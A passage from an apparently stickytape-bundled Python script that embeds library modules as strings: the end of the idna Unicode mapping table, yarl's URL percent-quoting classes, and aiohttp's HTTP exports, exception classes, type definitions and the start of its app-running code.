\'M\', \'\xf0\xa9\x88\x9a\'),\n    (0x2F9F8, \'M\', \'\xe4\xa9\xae\'),\n    (0x2F9F9, \'M\', \'\xe4\xa9\xb6\'),\n    (0x2F9FA, \'M\', \'\xe9\x9f\xa0\'),\n    (0x2F9FB, \'M\', \'\xf0\xa9\x90\x8a\'),\n    (0x2F9FC, \'M\', \'\xe4\xaa\xb2\'),\n    (0x2F9FD, \'M\', \'\xf0\xa9\x92\x96\'),\n    (0x2F9FE, \'M\', \'\xe9\xa0\x8b\'),\n    (0x2FA00, \'M\', \'\xe9\xa0\xa9\'),\n    (0x2FA01, \'M\', \'\xf0\xa9\x96\xb6\'),\n    (0x2FA02, \'M\', \'\xe9\xa3\xa2\'),\n    (0x2FA03, \'M\', \'\xe4\xac\xb3\'),\n    (0x2FA04, \'M\', \'\xe9\xa4\xa9\'),\n    (0x2FA05, \'M\', \'\xe9\xa6\xa7\'),\n    (0x2FA06, \'M\', \'\xe9\xa7\x82\'),\n    (0x2FA07, \'M\', \'\xe9\xa7\xbe\'),\n    (0x2FA08, \'M\', \'\xe4\xaf\x8e\'),\n    (0x2FA09, \'M\', \'\xf0\xa9\xac\xb0\'),\n    (0x2FA0A, \'M\', \'\xe9\xac\x92\'),\n    (0x2FA0B, \'M\', \'\xe9\xb1\x80\'),\n    (0x2FA0C, \'M\', \'\xe9\xb3\xbd\'),\n    (0x2FA0D, \'M\', \'\xe4\xb3\x8e\'),\n    (0x2FA0E, \'M\', \'\xe4\xb3\xad\'),\n    (0x2FA0F, \'M\', \'\xe9\xb5\xa7\'),\n    (0x2FA10, \'M\', \'\xf0\xaa\x83\x8e\'),\n    (0x2FA11, \'M\', \'\xe4\xb3\xb8\'),\n    (0x2FA12, \'M\', \'\xf0\xaa\x84\x85\'),\n    (0x2FA13, \'M\', \'\xf0\xaa\x88\x8e\'),\n    (0x2FA14, \'M\', \'\xf0\xaa\x8a\x91\'),\n    (0x2FA15, \'M\', \'\xe9\xba\xbb\'),\n    (0x2FA16, \'M\', \'\xe4\xb5\x96\'),\n    (0x2FA17, \'M\', \'\xe9\xbb\xb9\'),\n    (0x2FA18, \'M\', \'\xe9\xbb\xbe\'),\n    (0x2FA19, \'M\', \'\xe9\xbc\x85\'),\n    (0x2FA1A, \'M\', \'\xe9\xbc\x8f\'),\n    (0x2FA1B, \'M\', \'\xe9\xbc\x96\'),\n    (0x2FA1C, \'M\', \'\xe9\xbc\xbb\'),\n    (0x2FA1D, \'M\', \'\xf0\xaa\x98\x80\'),\n    (0x2FA1E, \'X\'),\n    (0x30000, \'V\'),\n    (0x3134B, \'X\'),\n    (0xE0100, \'I\'),\n    (0xE01F0, \'X\'),\n    ]\n\nuts46data = tuple(\n    _seg_0()\n    + _seg_1()\n    + _seg_2()\n    + _seg_3()\n    + _seg_4()\n    + _seg_5()\n    + _seg_6()\n    + _seg_7()\n    + _seg_8()\n    + _seg_9()\n    + _seg_10()\n    + _seg_11()\n    + _seg_12()\n    + _seg_13()\n    + _seg_14()\n    + _seg_15()\n    + _seg_16()\n    + _seg_17()\n    + _seg_18()\n    + _seg_19()\n    + _seg_20()\n    + _seg_21()\n    + _seg_22()\n    + _seg_23()\n    + _seg_24()\n    + _seg_25()\n    + _seg_26()\n    + _seg_27()\n    + _seg_28()\n    + _seg_29()\n    + _seg_30()\n    + _seg_31()\n    + _seg_32()\n    + _seg_33()\n    + _seg_34()\n    + _seg_35()\n    + _seg_36()\n    + _seg_37()\n    + _seg_38()\n    + _seg_39()\n    + _seg_40()\n    + _seg_41()\n    + _seg_42()\n    + _seg_43()\n    + _seg_44()\n    + _seg_45()\n    + _seg_46()\n    + _seg_47()\n    + _seg_48()\n    + _seg_49()\n    + _seg_50()\n    + _seg_51()\n    + _seg_52()\n    + _seg_53()\n    + _seg_54()\n    + _seg_55()\n    + _seg_56()\n    + _seg_57()\n    + _seg_58()\n    + _seg_59()\n    + _seg_60()\n    + _seg_61()\n    + _seg_62()\n    + _seg_63()\n    + _seg_64()\n    + _seg_65()\n    + _seg_66()\n    + _seg_67()\n    + _seg_68()\n    + _seg_69()\n    + _seg_70()\n    + _seg_71()\n    + _seg_72()\n    + _seg_73()\n    + _seg_74()\n    + _seg_75()\n    + _seg_76()\n    + _seg_77()\n    + _seg_78()\n    + _seg_79()\n    + _seg_80()\n)  # type: Tuple[Union[Tuple[int, str], Tuple[int, str, str]], ...]\n')
    __stickytape_write_module('yarl/_quoting.py', b'import os\r\nimport sys\r\n\r\n__all__ = ("_Quoter", "_Unquoter")\r\n\r\n\r\nNO_EXTENSIONS = bool(os.environ.get("YARL_NO_EXTENSIONS"))  # type: bool\r\nif sys.implementation.name != "cpython":\r\n    NO_EXTENSIONS = True\r\n\r\n\r\nif not NO_EXTENSIONS:  # pragma: no branch\r\n    try:\r\n        from ._quoting_c import _Quoter, _Unquoter  # type: ignore[misc]\r\n    except ImportError:  # pragma: no cover\r\n        from ._quoting_py import _Quoter, _Unquoter  # type: ignore[misc]\r\nelse:\r\n    from ._quoting_py import _Quoter, _Unquoter  # type: ignore[misc]\r\n')
    __stickytape_write_module('yarl/_quoting_py.py', b'import codecs\r\nimport re\r\nfrom string import ascii_letters, ascii_lowercase, digits\r\nfrom typing import Optional, cast\r\n\r\n\r\nBASCII_LOWERCASE = ascii_lowercase.encode("ascii")\r\nBPCT_ALLOWED = {"%{:02X}".format(i).encode("ascii") for i in range(256)}\r\nGEN_DELIMS = ":/?#[]@"\r\nSUB_DELIMS_WITHOUT_QS = "!$\'()*,"\r\nSUB_DELIMS = SUB_DELIMS_WITHOUT_QS + "+&=;"\r\nRESERVED = GEN_DELIMS + SUB_DELIMS\r\nUNRESERVED = ascii_letters + digits + "-._~"\r\nALLOWED = UNRESERVED + SUB_DELIMS_WITHOUT_QS\r\n\r\n\r\n_IS_HEX = re.compile(b"[A-Z0-9][A-Z0-9]")\r\n_IS_HEX_STR = re.compile("[A-Fa-f0-9][A-Fa-f0-9]")\r\n\r\nutf8_decoder = codecs.getincrementaldecoder("utf-8")\r\n\r\n\r\nclass _Quoter:\r\n    def __init__(\r\n        self,\r\n        *,\r\n        safe: str = "",\r\n        protected: str = "",\r\n        qs: bool = False,\r\n        requote: bool = True\r\n    ) -> None:\r\n        self._safe = safe\r\n        self._protected = protected\r\n        self._qs = qs\r\n        self._requote = requote\r\n\r\n    def __call__(self, val: Optional[str]) -> Optional[str]:\r\n        if val is None:\r\n            return None\r\n        if not isinstance(val, str):\r\n            raise TypeError("Argument should be str")\r\n        if not val:\r\n            return ""\r\n        bval = cast(str, val).encode("utf8", errors="ignore")\r\n        ret = bytearray()\r\n        pct = bytearray()\r\n        safe = self._safe\r\n        safe += ALLOWED\r\n        if not self._qs:\r\n            safe += "+&=;"\r\n        safe += self._protected\r\n        bsafe = safe.encode("ascii")\r\n        idx = 0\r\n        while idx < len(bval):\r\n            ch = bval[idx]\r\n            idx += 1\r\n\r\n            if pct:\r\n                if ch in BASCII_LOWERCASE:\r\n                    ch = ch - 32  # convert to uppercase\r\n                pct.append(ch)\r\n                if len(pct) == 3:  # pragma: no branch   # peephole optimizer\r\n                    buf = pct[1:]\r\n                    if not _IS_HEX.match(buf):\r\n                        ret.extend(b"%25")\r\n                        pct.clear()\r\n                        idx -= 2\r\n                        continue\r\n                    try:\r\n                        unquoted = chr(int(pct[1:].decode("ascii"), base=16))\r\n                    except ValueError:\r\n                        ret.extend(b"%25")\r\n                        pct.clear()\r\n                        idx -= 2\r\n                        continue\r\n\r\n                    if unquoted in self._protected:\r\n                        ret.extend(pct)\r\n                    elif unquoted in safe:\r\n                        ret.append(ord(unquoted))\r\n                    else:\r\n                        ret.extend(pct)\r\n                    pct.clear()\r\n\r\n                # special case, if we have only one char after "%"\r\n                elif len(pct) == 2 and idx == len(bval):\r\n                    ret.extend(b"%25")\r\n                    pct.clear()\r\n                    idx -= 1\r\n\r\n                continue\r\n\r\n            elif ch == ord("%") and self._requote:\r\n                pct.clear()\r\n                pct.append(ch)\r\n\r\n                # special case if "%" is last char\r\n                if idx == len(bval):\r\n                    ret.extend(b"%25")\r\n\r\n                continue\r\n\r\n            if self._qs:\r\n                if ch == ord(" "):\r\n                    ret.append(ord("+"))\r\n                    continue\r\n            if ch in bsafe:\r\n                ret.append(ch)\r\n                continue\r\n\r\n            ret.extend(("%{:02X}".format(ch)).encode("ascii"))\r\n\r\n        ret2 = ret.decode("ascii")\r\n        if ret2 == val:\r\n            return val\r\n        return ret2\r\n\r\n\r\nclass _Unquoter:\r\n    def __init__(self, *, unsafe: str = "", qs: bool = False) -> None:\r\n        self._unsafe = unsafe\r\n        self._qs = qs\r\n        self._quoter = _Quoter()\r\n        self._qs_quoter = _Quoter(qs=True)\r\n\r\n    def __call__(self, val: Optional[str]) -> Optional[str]:\r\n        if val is None:\r\n            return None\r\n        if not isinstance(val, str):\r\n            raise TypeError("Argument should be str")\r\n        if not val:\r\n            return ""\r\n        decoder = cast(codecs.BufferedIncrementalDecoder, utf8_decoder())\r\n        ret = []\r\n        idx = 0\r\n        while idx < len(val):\r\n            ch = val[idx]\r\n            idx += 1\r\n            if ch == "%" and idx <= len(val) - 2:\r\n                pct = val[idx : idx + 2]\r\n                if _IS_HEX_STR.fullmatch(pct):\r\n                    b = bytes([int(pct, base=16)])\r\n                    idx += 2\r\n                    try:\r\n                        unquoted = decoder.decode(b)\r\n                    except UnicodeDecodeError:\r\n                        start_pct = idx - 3 - len(decoder.buffer) * 3\r\n                        ret.append(val[start_pct : idx - 3])\r\n                        decoder.reset()\r\n                        try:\r\n                            unquoted = decoder.decode(b)\r\n                        except UnicodeDecodeError:\r\n                            ret.append(val[idx - 3 : idx])\r\n                            continue\r\n                    if not unquoted:\r\n                        continue\r\n                    if self._qs and unquoted in "+=&;":\r\n                        to_add = self._qs_quoter(unquoted)\r\n                        if to_add is None:  # pragma: no cover\r\n                            raise RuntimeError("Cannot quote None")\r\n                        ret.append(to_add)\r\n                    elif unquoted in self._unsafe:\r\n                        to_add = self._quoter(unquoted)\r\n                        if to_add is None:  # pragma: no cover\r\n                            raise RuntimeError("Cannot quote None")\r\n                        ret.append(to_add)\r\n                    else:\r\n                        ret.append(unquoted)\r\n                    continue\r\n\r\n            if decoder.buffer:\r\n                start_pct = idx - 1 - len(decoder.buffer) * 3\r\n                ret.append(val[start_pct : idx - 1])\r\n                decoder.reset()\r\n\r\n            if ch == "+":\r\n                if not self._qs or ch in self._unsafe:\r\n                    ret.append("+")\r\n                else:\r\n                    ret.append(" ")\r\n                continue\r\n\r\n            if ch in self._unsafe:\r\n                ret.append("%")\r\n                h = hex(ord(ch)).upper()[2:]\r\n                for ch in h:\r\n                    ret.append(ch)\r\n                continue\r\n\r\n            ret.append(ch)\r\n\r\n        if decoder.buffer:\r\n            ret.append(val[-len(decoder.buffer) * 3 :])\r\n\r\n        ret2 = "".join(ret)\r\n        if ret2 == val:\r\n            return val\r\n        return ret2\r\n')
    __stickytape_write_module('aiohttp/http.py', b'import http.server\r\nimport sys\r\nfrom typing import Mapping, Tuple\r\n\r\nfrom . import __version__\r\nfrom .http_exceptions import HttpProcessingError as HttpProcessingError\r\nfrom .http_parser import (\r\n    HeadersParser as HeadersParser,\r\n    HttpParser as HttpParser,\r\n    HttpRequestParser as HttpRequestParser,\r\n    HttpResponseParser as HttpResponseParser,\r\n    RawRequestMessage as RawRequestMessage,\r\n    RawResponseMessage as RawResponseMessage,\r\n)\r\nfrom .http_websocket import (\r\n    WS_CLOSED_MESSAGE as WS_CLOSED_MESSAGE,\r\n    WS_CLOSING_MESSAGE as WS_CLOSING_MESSAGE,\r\n    WS_KEY as WS_KEY,\r\n    WebSocketError as WebSocketError,\r\n    WebSocketReader as WebSocketReader,\r\n    WebSocketWriter as WebSocketWriter,\r\n    WSCloseCode as WSCloseCode,\r\n    WSMessage as WSMessage,\r\n    WSMsgType as WSMsgType,\r\n    ws_ext_gen as ws_ext_gen,\r\n    ws_ext_parse as ws_ext_parse,\r\n)\r\nfrom .http_writer import (\r\n    HttpVersion as HttpVersion,\r\n    HttpVersion10 as HttpVersion10,\r\n    HttpVersion11 as HttpVersion11,\r\n    StreamWriter as StreamWriter,\r\n)\r\n\r\n__all__ = (\r\n    "HttpProcessingError",\r\n    "RESPONSES",\r\n    "SERVER_SOFTWARE",\r\n    # .http_writer\r\n    "StreamWriter",\r\n    "HttpVersion",\r\n    "HttpVersion10",\r\n    "HttpVersion11",\r\n    # .http_parser\r\n    "HeadersParser",\r\n    "HttpParser",\r\n    "HttpRequestParser",\r\n    "HttpResponseParser",\r\n    "RawRequestMessage",\r\n    "RawResponseMessage",\r\n    # .http_websocket\r\n    "WS_CLOSED_MESSAGE",\r\n    "WS_CLOSING_MESSAGE",\r\n    "WS_KEY",\r\n    "WebSocketReader",\r\n    "WebSocketWriter",\r\n    "ws_ext_gen",\r\n    "ws_ext_parse",\r\n    "WSMessage",\r\n    "WebSocketError",\r\n    "WSMsgType",\r\n    "WSCloseCode",\r\n)\r\n\r\n\r\nSERVER_SOFTWARE = "Python/{0[0]}.{0[1]} aiohttp/{1}".format(\r\n    sys.version_info, __version__\r\n)  # type: str\r\n\r\nRESPONSES = (\r\n    http.server.BaseHTTPRequestHandler.responses\r\n)  # type: Mapping[int, Tuple[str, str]]\r\n')
    __stickytape_write_module('aiohttp/http_exceptions.py', b'"""Low-level http related exceptions."""\r\n\r\n\r\nfrom typing import Optional, Union\r\n\r\nfrom .typedefs import _CIMultiDict\r\n\r\n__all__ = ("HttpProcessingError",)\r\n\r\n\r\nclass HttpProcessingError(Exception):\r\n    """HTTP error.\r\n\r\n    Shortcut for raising HTTP errors with custom code, message and headers.\r\n\r\n    code: HTTP Error code.\r\n    message: (optional) Error message.\r\n    headers: (optional) Headers to be sent in response, a list of pairs\r\n    """\r\n\r\n    code = 0\r\n    message = ""\r\n    headers = None\r\n\r\n    def __init__(\r\n        self,\r\n        *,\r\n        code: Optional[int] = None,\r\n        message: str = "",\r\n        headers: Optional[_CIMultiDict] = None,\r\n    ) -> None:\r\n        if code is not None:\r\n            self.code = code\r\n        self.headers = headers\r\n        self.message = message\r\n\r\n    def __str__(self) -> str:\r\n        return f"{self.code}, message={self.message!r}"\r\n\r\n    def __repr__(self) -> str:\r\n        return f"<{self.__class__.__name__}: {self}>"\r\n\r\n\r\nclass BadHttpMessage(HttpProcessingError):\r\n\r\n    code = 400\r\n    message = "Bad Request"\r\n\r\n    def __init__(self, message: str, *, headers: Optional[_CIMultiDict] = None) -> None:\r\n        super().__init__(message=message, headers=headers)\r\n        self.args = (message,)\r\n\r\n\r\nclass HttpBadRequest(BadHttpMessage):\r\n\r\n    code = 400\r\n    message = "Bad Request"\r\n\r\n\r\nclass PayloadEncodingError(BadHttpMessage):\r\n    """Base class for payload errors"""\r\n\r\n\r\nclass ContentEncodingError(PayloadEncodingError):\r\n    """Content encoding error."""\r\n\r\n\r\nclass TransferEncodingError(PayloadEncodingError):\r\n    """transfer encoding error."""\r\n\r\n\r\nclass ContentLengthError(PayloadEncodingError):\r\n    """Not enough data for satisfy content length header."""\r\n\r\n\r\nclass LineTooLong(BadHttpMessage):\r\n    def __init__(\r\n        self, line: str, limit: str = "Unknown", actual_size: str = "Unknown"\r\n    ) -> None:\r\n        super().__init__(\r\n            f"Got more than {limit} bytes ({actual_size}) when reading {line}."\r\n        )\r\n        self.args = (line, limit, actual_size)\r\n\r\n\r\nclass InvalidHeader(BadHttpMessage):\r\n    def __init__(self, hdr: Union[bytes, str]) -> None:\r\n        if isinstance(hdr, bytes):\r\n            hdr = hdr.decode("utf-8", "surrogateescape")\r\n        super().__init__(f"Invalid HTTP Header: {hdr}")\r\n        self.hdr = hdr\r\n        self.args = (hdr,)\r\n\r\n\r\nclass BadStatusLine(BadHttpMessage):\r\n    def __init__(self, line: str = "") -> None:\r\n        if not isinstance(line, str):\r\n            line = repr(line)\r\n        super().__init__(f"Bad status line {line!r}")\r\n        self.args = (line,)\r\n        self.line = line\r\n\r\n\r\nclass InvalidURLError(BadHttpMessage):\r\n    pass\r\n')
    __stickytape_write_module('aiohttp/typedefs.py', b'import json\r\nimport os\r\nimport sys\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Iterable,\r\n    Mapping,\r\n    Tuple,\r\n    Union,\r\n)\r\n\r\nfrom multidict import CIMultiDict, CIMultiDictProxy, MultiDict, MultiDictProxy, istr\r\nfrom yarl import URL\r\n\r\n# These are for other modules to use (to avoid repeating the conditional import).\r\nif sys.version_info >= (3, 8):\r\n    from typing import Final as Final, Protocol as Protocol, TypedDict as TypedDict\r\nelse:\r\n    from typing_extensions import (  # noqa: F401\r\n        Final,\r\n        Protocol as Protocol,\r\n        TypedDict as TypedDict,\r\n    )\r\n\r\nDEFAULT_JSON_ENCODER = json.dumps\r\nDEFAULT_JSON_DECODER = json.loads\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    _CIMultiDict = CIMultiDict[str]\r\n    _CIMultiDictProxy = CIMultiDictProxy[str]\r\n    _MultiDict = MultiDict[str]\r\n    _MultiDictProxy = MultiDictProxy[str]\r\n    from http.cookies import BaseCookie, Morsel\r\n\r\n    from .web import Request, StreamResponse\r\nelse:\r\n    _CIMultiDict = CIMultiDict\r\n    _CIMultiDictProxy = CIMultiDictProxy\r\n    _MultiDict = MultiDict\r\n    _MultiDictProxy = MultiDictProxy\r\n\r\nByteish = Union[bytes, bytearray, memoryview]\r\nJSONEncoder = Callable[[Any], str]\r\nJSONDecoder = Callable[[str], Any]\r\nLooseHeaders = Union[Mapping[Union[str, istr], str], _CIMultiDict, _CIMultiDictProxy]\r\nRawHeaders = Tuple[Tuple[bytes, bytes], ...]\r\nStrOrURL = Union[str, URL]\r\n\r\nLooseCookiesMappings = Mapping[str, Union[str, "BaseCookie[str]", "Morsel[Any]"]]\r\nLooseCookiesIterables = Iterable[\r\n    Tuple[str, Union[str, "BaseCookie[str]", "Morsel[Any]"]]\r\n]\r\nLooseCookies = Union[\r\n    LooseCookiesMappings,\r\n    LooseCookiesIterables,\r\n    "BaseCookie[str]",\r\n]\r\n\r\nHandler = Callable[["Request"], Awaitable["StreamResponse"]]\r\n\r\nPathLike = Union[str, "os.PathLike[str]"]\r\n')
    __stickytape_write_module('aiohttp/web.py', b'import asyncio\r\nimport logging\r\nimport socket\r\nimport sys\r\nfrom argparse import ArgumentParser\r\nfrom collections.abc import Iterable\r\nfrom importlib import import_module\r\nfrom typing import (\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Iterable as TypingIterable,\r\n    List,\r\n    Optional,\r\n    Set,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nfrom .abc import AbstractAccessLogger\r\nfrom .helpers import all_tasks\r\nfrom .log import access_logger\r\nfrom .web_app import Application as Application, CleanupError as CleanupError\r\nfrom .web_exceptions import (\r\n    HTTPAccepted as HTTPAccepted,\r\n    HTTPBadGateway as HTTPBadGateway,\r\n    HTTPBadRequest as HTTPBadRequest,\r\n    HTTPClientError as HTTPClientError,\r\n    HTTPConflict as HTTPConflict,\r\n    HTTPCreated as HTTPCreated,\r\n    HTTPError as HTTPError,\r\n    HTTPException as HTTPException,\r\n    HTTPExpectationFailed as HTTPExpectationFailed,\r\n    HTTPFailedDependency as HTTPFailedDependency,\r\n    HTTPForbidden as HTTPForbidden,\r\n    HTTPFound as HTTPFound,\r\n    HTTPGatewayTimeout as HTTPGatewayTimeout,\r\n    HTTPGone as HTTPGone,\r\n    HTTPInsufficientStorage as HTTPInsufficientStorage,\r\n    HTTPInternalServerError as HTTPInternalServerError,\r\n    HTTPLengthRequired as HTTPLengthRequired,\r\n    HTTPMethodNotAllowed as HTTPMethodNotAllowed,\r\n    HTTPMisdirectedRequest as HTTPMisdirectedRequest,\r\n    HTTPMovedPermanently as HTTPMovedPermanently,\r\n    HTTPMultipleChoices as HTTPMultipleChoices,\r\n    HTTPNetworkAuthenticationRequired as HTTPNetworkAuthenticationRequired,\r\n    HTTPNoContent as HTTPNoContent,\r\n    HTTPNonAuthoritativeInformation as HTTPNonAuthoritativeInformation,\r\n    HTTPNotAcceptable as HTTPNotAcceptable,\r\n    HTTPNotExtended as HTTPNotExtended,\r\n    HTTPNotFound as HTTPNotFound,\r\n    HTTPNotImplemented as HTTPNotImplemented,\r\n    HTTPNotModified as HTTPNotModified,\r\n    HTTPOk as HTTPOk,\r\n    HTTPPartialContent as HTTPPartialContent,\r\n    HTTPPaymentRequired as HTTPPaymentRequired,\r\n    HTTPPermanentRedirect as HTTPPermanentRedirect,\r\n    HTTPPreconditionFailed as HTTPPreconditionFailed,\r\n    HTTPPreconditionRequired as HTTPPreconditionRequired,\r\n    HTTPProxyAuthenticationRequired as HTTPProxyAuthenticationRequired,\r\n    HTTPRedirection as HTTPRedirection,\r\n    HTTPRequestEntityTooLarge as HTTPRequestEntityTooLarge,\r\n    HTTPRequestHeaderFieldsTooLarge as HTTPRequestHeaderFieldsTooLarge,\r\n    HTTPRequestRangeNotSatisfiable as HTTPRequestRangeNotSatisfiable,\r\n    HTTPRequestTimeout as HTTPRequestTimeout,\r\n    HTTPRequestURITooLong as HTTPRequestURITooLong,\r\n    HTTPResetContent as HTTPResetContent,\r\n    HTTPSeeOther as HTTPSeeOther,\r\n    HTTPServerError as HTTPServerError,\r\n    HTTPServiceUnavailable as HTTPServiceUnavailable,\r\n    HTTPSuccessful as HTTPSuccessful,\r\n    HTTPTemporaryRedirect as HTTPTemporaryRedirect,\r\n    HTTPTooManyRequests as HTTPTooManyRequests,\r\n    HTTPUnauthorized as HTTPUnauthorized,\r\n    HTTPUnavailableForLegalReasons as HTTPUnavailableForLegalReasons,\r\n    HTTPUnprocessableEntity as HTTPUnprocessableEntity,\r\n    HTTPUnsupportedMediaType as HTTPUnsupportedMediaType,\r\n    HTTPUpgradeRequired as HTTPUpgradeRequired,\r\n    HTTPUseProxy as HTTPUseProxy,\r\n    HTTPVariantAlsoNegotiates as HTTPVariantAlsoNegotiates,\r\n    HTTPVersionNotSupported as HTTPVersionNotSupported,\r\n)\r\nfrom .web_fileresponse import FileResponse as FileResponse\r\nfrom .web_log import AccessLogger\r\nfrom .web_middlewares import (\r\n    middleware as middleware,\r\n    normalize_path_middleware as normalize_path_middleware,\r\n)\r\nfrom .web_protocol import (\r\n    PayloadAccessError as PayloadAccessError,\r\n    RequestHandler as RequestHandler,\r\n    RequestPayloadError as RequestPayloadError,\r\n)\r\nfrom .web_request import (\r\n    BaseRequest as BaseRequest,\r\n    FileField as FileField,\r\n    Request as Request,\r\n)\r\nfrom .web_response import (\r\n    ContentCoding as ContentCoding,\r\n    Response as Response,\r\n    StreamResponse as StreamResponse,\r\n    json_response as json_response,\r\n)\r\nfrom .web_routedef import (\r\n    AbstractRouteDef as AbstractRouteDef,\r\n    RouteDef as RouteDef,\r\n    RouteTableDef as RouteTableDef,\r\n    StaticDef as StaticDef,\r\n    delete as delete,\r\n    get as get,\r\n    head as head,\r\n    options as options,\r\n    patch as patch,\r\n    post as post,\r\n    put as put,\r\n    route as route,\r\n    static as static,\r\n    view as view,\r\n)\r\nfrom .web_runner import (\r\n    AppRunner as AppRunner,\r\n    BaseRunner as BaseRunner,\r\n    BaseSite as BaseSite,\r\n    GracefulExit as GracefulExit,\r\n    NamedPipeSite as NamedPipeSite,\r\n    ServerRunner as ServerRunner,\r\n    SockSite as SockSite,\r\n    TCPSite as TCPSite,\r\n    UnixSite as UnixSite,\r\n)\r\nfrom .web_server import Server as Server\r\nfrom .web_urldispatcher import (\r\n    AbstractResource as AbstractResource,\r\n    AbstractRoute as AbstractRoute,\r\n    DynamicResource as DynamicResource,\r\n    PlainResource as PlainResource,\r\n    Resource as Resource,\r\n    ResourceRoute as ResourceRoute,\r\n    StaticResource as StaticResource,\r\n    UrlDispatcher as UrlDispatcher,\r\n    UrlMappingMatchInfo as UrlMappingMatchInfo,\r\n    View as View,\r\n)\r\nfrom .web_ws import (\r\n    WebSocketReady as WebSocketReady,\r\n    WebSocketResponse as WebSocketResponse,\r\n    WSMsgType as WSMsgType,\r\n)\r\n\r\n__all__ = (\r\n    # web_app\r\n    "Application",\r\n    "CleanupError",\r\n    # web_exceptions\r\n    "HTTPAccepted",\r\n    "HTTPBadGateway",\r\n    "HTTPBadRequest",\r\n    "HTTPClientError",\r\n    "HTTPConflict",\r\n    "HTTPCreated",\r\n    "HTTPError",\r\n    "HTTPException",\r\n    "HTTPExpectationFailed",\r\n    "HTTPFailedDependency",\r\n    "HTTPForbidden",\r\n    "HTTPFound",\r\n    "HTTPGatewayTimeout",\r\n    "HTTPGone",\r\n    "HTTPInsufficientStorage",\r\n    "HTTPInternalServerError",\r\n    "HTTPLengthRequired",\r\n    "HTTPMethodNotAllowed",\r\n    "HTTPMisdirectedRequest",\r\n    "HTTPMovedPermanently",\r\n    "HTTPMultipleChoices",\r\n    "HTTPNetworkAuthenticationRequired",\r\n    "HTTPNoContent",\r\n    "HTTPNonAuthoritativeInformation",\r\n    "HTTPNotAcceptable",\r\n    "HTTPNotExtended",\r\n    "HTTPNotFound",\r\n    "HTTPNotImplemented",\r\n    "HTTPNotModified",\r\n    "HTTPOk",\r\n    "HTTPPartialContent",\r\n    "HTTPPaymentRequired",\r\n    "HTTPPermanentRedirect",\r\n    "HTTPPreconditionFailed",\r\n    "HTTPPreconditionRequired",\r\n    "HTTPProxyAuthenticationRequired",\r\n    "HTTPRedirection",\r\n    "HTTPRequestEntityTooLarge",\r\n    "HTTPRequestHeaderFieldsTooLarge",\r\n    "HTTPRequestRangeNotSatisfiable",\r\n    "HTTPRequestTimeout",\r\n    "HTTPRequestURITooLong",\r\n    "HTTPResetContent",\r\n    "HTTPSeeOther",\r\n    "HTTPServerError",\r\n    "HTTPServiceUnavailable",\r\n    "HTTPSuccessful",\r\n    "HTTPTemporaryRedirect",\r\n    "HTTPTooManyRequests",\r\n    "HTTPUnauthorized",\r\n    "HTTPUnavailableForLegalReasons",\r\n    "HTTPUnprocessableEntity",\r\n    "HTTPUnsupportedMediaType",\r\n    "HTTPUpgradeRequired",\r\n    "HTTPUseProxy",\r\n    "HTTPVariantAlsoNegotiates",\r\n    "HTTPVersionNotSupported",\r\n    # web_fileresponse\r\n    "FileResponse",\r\n    # web_middlewares\r\n    "middleware",\r\n    "normalize_path_middleware",\r\n    # web_protocol\r\n    "PayloadAccessError",\r\n    "RequestHandler",\r\n    "RequestPayloadError",\r\n    # web_request\r\n    "BaseRequest",\r\n    "FileField",\r\n    "Request",\r\n    # web_response\r\n    "ContentCoding",\r\n    "Response",\r\n    "StreamResponse",\r\n    "json_response",\r\n    # web_routedef\r\n    "AbstractRouteDef",\r\n    "RouteDef",\r\n    "RouteTableDef",\r\n    "StaticDef",\r\n    "delete",\r\n    "get",\r\n    "head",\r\n    "options",\r\n    "patch",\r\n    "post",\r\n    "put",\r\n    "route",\r\n    "static",\r\n    "view",\r\n    # web_runner\r\n    "AppRunner",\r\n    "BaseRunner",\r\n    "BaseSite",\r\n    "GracefulExit",\r\n    "ServerRunner",\r\n    "SockSite",\r\n    "TCPSite",\r\n    "UnixSite",\r\n    "NamedPipeSite",\r\n    # web_server\r\n    "Server",\r\n    # web_urldispatcher\r\n    "AbstractResource",\r\n    "AbstractRoute",\r\n    "DynamicResource",\r\n    "PlainResource",\r\n    "Resource",\r\n    "ResourceRoute",\r\n    "StaticResource",\r\n    "UrlDispatcher",\r\n    "UrlMappingMatchInfo",\r\n    "View",\r\n    # web_ws\r\n    "WebSocketReady",\r\n    "WebSocketResponse",\r\n    "WSMsgType",\r\n    # web\r\n    "run_app",\r\n)\r\n\r\n\r\ntry:\r\n    from ssl import SSLContext\r\nexcept ImportError:  # pragma: no cover\r\n    SSLContext = Any  # type: ignore[misc,assignment]\r\n\r\nHostSequence = TypingIterable[str]\r\n\r\n\r\nasync def _run_app(\r\n    app: Union[Application, Awaitable[Application]],\r\n    *,\r\n    host: Optional[Union[str, HostSequence]] = None,\r\n    port: Optional[int] = None,\r\n    path: Optional[str] = None,\r\n    sock: Optional[socket.socket] = None,\r\n    shutdown_timeout: float = 60.0,\r\n    keepalive_timeout: float = 75.0,\r\n    ssl_context: Optional[SSLContext] = None,\r\n    print: Callable[..., None] = print,\r\n    backlog: int = 128,\r\n    access_log_class: Type[AbstractAccessLogger] = AccessLogger,\r\n    access_log_format: str = AccessLogger.LOG_FORMAT,\r\n    access_log: Optional[logging.Logger] = access_logger,\r\n    handle_signals: bool = True,\r\n    reuse_address: Optional[bool] = None,\r\n    reuse_port: Optional[bool] = None,\r\n) -> None:\r\n    # A internal functio to actually do all dirty job for application running\r\n    if asyncio.iscoroutine(app):\r\n        app = await app  # type: ignore[misc]\r\n\r\n    app = cast(Application, app)\r\n\r\n    runner = AppRunner(\r\n        app,\r\n        handle_signals=handle_signals,\r\n        access_log_class=access_log_class,\r\n        access_log_format=access_log_format,\r\n        access_log=access_log,\r\n        keepalive_timeout=keepalive_timeout,\r\n    )\r\n\r\n    await runner.setup()\r\n\r\n    sites = []  # type: List[BaseSite]\r\n\r\n    try:\r\n        if host is not None:\r\n            if isinstance(host, (str, bytes, bytearray, memoryview)):\r\n                sites.append(\r\n                    TCPSite(\r\n                        runner,\r\n                        host,\r\n                        port,\r\n                        shutdown_timeout=shutdown_timeout,\r\n                        ssl_context=ssl_context,\r\n                        backlog=backlog,\r\n                        reuse_address=reuse_address,\r\n                        reuse_port=reuse_port,\r\n                    )\r\n                )\r\n            else:\r\n                for h in host:\r\n                    sites.append(\r\n                        TCPSite(\r\n                            runner,\r\n                            h,\r\n                            port,\r\n                            shutdown_timeout=shutdown_timeout,\r\n                            